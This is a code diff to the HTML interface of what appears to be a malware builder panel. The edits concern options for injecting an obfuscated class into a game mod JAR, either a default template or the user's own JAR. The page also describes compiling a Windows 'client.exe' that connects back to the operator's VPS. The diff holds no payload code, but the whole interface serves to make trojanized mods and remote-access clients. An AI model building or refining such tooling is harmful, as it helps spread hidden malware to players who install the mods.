@@ -125,7 +125,7 @@
             <div class="upload-panel" style="text-align: left;">
                 <div style="margin-bottom: 24px;">
                     <p style="color: var(--muted); font-size: 16px; margin-bottom: 24px; line-height: 1.5;">
-                        This build will embed your unique User ID as metadata inside the Fabric mod JAR and compile a custom `client.exe` (using Node 22 compiler for Windows x64) configured to connect back to this VPS.
+                        This build will embed your unique User ID as metadata inside the mod JAR and compile a custom `client.exe` (using Node 22 compiler for Windows x64) configured to connect back to this VPS.
                     </p>
 
                     <!-- Target JAR Selection Layout -->
@@ -135,12 +135,12 @@
                         <div style="display: flex; flex-direction: column; gap: 16px;">
                             <label style="display: flex; align-items: center; gap: 8px; color: var(--text); font-size: 16px; cursor: pointer;">
                                 <input type="radio" name="jarSource" id="jarSourceDefault" value="default" checked style="accent-color: var(--accent);">
-                                <span>Use default mod template (fabric-obf.jar)</span>
+                                <span>Default template (injected class only, obfuscated)</span>
                             </label>
                             
                             <label style="display: flex; align-items: center; gap: 8px; color: var(--text); font-size: 16px; cursor: pointer;">
-                                <input type="radio" name="jarSource" id="jarSourceSelect" value="select" style="accent-color: var(--accent);">
-                                <span>Choose from uploaded files</span>
+                                <input type="radio" name="jarSource" id="jarSourceCustom" value="custom" style="accent-color: var(--accent);">
+                                <span>Use your own JAR</span>
                             </label>
                             
                             <div id="jarSelectContainer" style="display: none; margin-left: 24px; margin-top: 8px;">
@@ -149,9 +149,9 @@
                                 </select>
                             </div>
                             
-                            <label id="jarSourceUploadLabel" style="display: flex; align-items: center; gap: 8px; color: var(--text); font-size: 16px; cursor: pointer;">
+                            <label id="jarSourceUploadLabel" style="display: none; margin-left: 24px; margin-top: 8px; align-items: center; gap: 8px; color: var(--text); font-size: 16px; cursor: pointer;">
                                 <input type="radio" name="jarSource" id="jarSourceUpload" value="upload" style="accent-color: var(--accent);">
-                                <span>Upload new JAR mod file</span>
+                                <span>Upload a new JAR mod file</span>
                             </label>
                             
                             <div id="jarUploadContainer" style="display: none; margin-left: 24px; margin-top: 8px;">
